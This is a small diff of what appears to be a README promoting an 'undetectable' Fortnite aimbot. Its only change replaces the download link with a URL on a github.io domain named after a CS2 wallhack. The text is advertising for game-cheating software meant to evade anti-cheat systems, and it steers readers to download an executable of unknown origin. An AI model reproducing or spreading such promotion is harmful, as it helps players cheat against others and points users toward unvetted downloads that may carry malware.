@@ -2,7 +2,7 @@
 
 Boost your Fortnite gameplay with **Aimbot for Fortnite**, the most advanced aim-assist tool for PC. Dominate battles with flawless accuracy, customizable settings, and undetectable performance. Perfect for competitive players!
 
-[![Download Aimbot for Fortnite](https://img.shields.io/badge/Download-Fortnite_Aimbot-blueviolet)](https://aimbot-for-fortnite.github.io/.github/)
+[![Download Aimbot for Fortnite](https://img.shields.io/badge/Download-Fortnite_Aimbot-blueviolet)](https://cs2-wallhack-undetected.github.io/.github/aimbotfortnite)
 
 ---
 
